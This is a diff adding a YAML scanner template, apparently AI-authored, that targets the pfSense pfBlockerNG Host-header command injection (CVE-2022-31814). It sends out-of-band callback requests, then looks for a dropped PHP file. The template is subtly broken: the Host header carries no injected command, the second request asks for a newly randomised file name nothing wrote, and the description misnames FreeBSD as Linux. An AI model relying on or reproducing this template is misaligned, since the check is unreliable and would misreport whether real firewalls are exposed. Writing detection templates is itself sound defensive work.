@@ -1,0 +1,39 @@
+id: pfsense-rce-cve-2022-31814
+info:
+  name: pfSense Host RCE (CVE-2022-31814)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    pfSense is a network firewall based on FreeBSD Linux. There was a security vulnerability in pfSense pfBlockerNG prior to version 2.1.4_26. A remote attacker can execute arbitrary operating system commands as root via the shell metacharacter in the HTTP host header.
+  classification:
+    cve-id: CVE-2022-31814
+    cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 10.0
+  tags: rce,critical,freebsd,firewall
+http:
+  - raw:
+      - |
+        GET /pfblockerng/www/index.php HTTP/1.1
+        Host: {{rand_text_alphanumeric(8)}}.{{interactsh-url}}
+        User-Agent: python-requests/2.28.0
+        Accept: */*
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "GIF89a"
+  - raw:
+      - |
+        GET /{{rand_text_alphanumeric(8)}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.28.0
+        Accept: */*
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
